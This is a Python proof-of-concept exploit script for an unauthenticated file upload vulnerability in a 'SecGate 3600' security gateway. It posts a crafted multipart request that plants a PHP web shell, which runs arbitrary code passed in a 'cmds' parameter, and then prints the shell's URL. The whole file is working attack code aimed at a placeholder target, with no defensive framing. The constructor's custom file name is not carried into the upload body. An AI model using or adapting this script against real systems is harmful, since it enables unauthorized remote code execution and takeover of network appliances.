# SecGate 3600 Unauthorized file upload from obj_app_upfile
from requests import post
from urllib.parse import urlparse


class SecGateUploader:
    base_url: str = ""
    headers: dict = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=----WebkitFormBoundary4E37E70A87AD2FD2"
    }
    file_name = "vuln_poc.php"
    file_content = "<?php if($_REQUEST[\"cmds\"]) {eval($_REQUEST[\"cmds\"]);} else {phpinfo();} ?>"
    file_data = f"------WebkitFormBoundary4E37E70A87AD2FD2\r\n" \
                f"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n" \
                f"------WebkitFormBoundary4E37E70A87AD2FD2\r\n" \
                f"Content-Disposition: form-data; name=\"upfile\"; filename=\"{file_name}\"\r\n" \
                f"Content-Type: text/plain\r\n\r\n{file_content}\r\n" \
                f"------WebkitFormBoundary4E37E70A87AD2FD2\r\n" \
                f"Content-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n" \
                f"------WebkitFormBoundary4E37E70A87AD2FD2\r\n" \
                f"Content-Disposition: form-data; name=\"__hash__\"\r\n " \
                f"\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n" \
                f"------WebkitFormBoundary4E37E70A87AD2FD2--"

    def __init__(self, url: str, file_name: str = "file.php", file_content=None, headers=None):
        url_data = urlparse(url)
        self.base_url = url_data.scheme + "://" + url_data.netloc
        print("[*] Init: Setting target as", self.base_url)
        if file_name is not None and file_name.endswith(".php"):
            self.file_name = file_name
        if file_content is not None:
            self.file_content = file_content
        if headers is not None:
            self.headers = headers

    def run_upload(self):
        self.base_url = self.base_url.strip('/')
        print("[*] Target:", self.base_url)
        print("[*] Vuln: Upload file unauthorized.")
        real_url = self.base_url + "/?g=random_words"
        print("[*] Uploading file from:", real_url)
        rsp = post(url=real_url, headers=self.headers, data=self.file_data, allow_redirects=False)
        if rsp.status_code == 302:
            print("[+] Upload successed. Path:", self.base_url + "/attachements/" + self.file_name)
        else:
            print("[-] Upload failed. Target seems safe. RetCode:", rsp.status_code)


if __name__ == '__main__':
    base_url = "http://[ip]:[port]"
    SecGateUploader(url=base_url, file_name="vuln.php").run_upload()
